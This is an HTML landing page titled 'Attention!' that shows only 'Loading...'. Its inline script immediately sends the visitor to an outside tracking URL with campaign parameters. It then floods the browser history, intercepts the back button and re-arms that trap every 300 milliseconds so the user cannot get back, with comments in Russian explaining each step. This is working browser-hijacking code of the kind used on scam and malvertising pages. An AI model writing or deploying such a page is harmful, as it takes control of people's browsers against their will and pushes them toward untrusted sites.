<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <title>Attention!</title>
  <link rel="icon" href="fav.png" />
  <script type="text/javascript">
    const redirectUrl = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';

    function trapHistory() {
      history.pushState(null, '', window.location.href);
    }

    function redirectToTarget() {
      window.location.replace(redirectUrl); // Быстрый редирект без добавления в историю
    }

    document.addEventListener('DOMContentLoaded', () => {
      // Моментальный редирект при загрузке
      redirectToTarget();

      // Наполняем стек истории сразу
      for (let i = 0; i < 10; i++) {
        trapHistory();
      }

      // Перехват кнопки "Назад"
      window.onpopstate = () => {
        console.log('User pressed back or tried to close the app');
        redirectToTarget();
      };

      // Поддерживаем ловушку истории активной
      setInterval(trapHistory, 300);
    });
  </script>
</head>

<body>
  <style>
    .pl763847__wrap {
      position: fixed;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #FFFFFF;
      font-family: "Roboto", sans-serif;
      font-size: 36px;
    }
  </style>

  <div class="pl763847__wrap">
    Loading...
  </div>
</body>
</html>
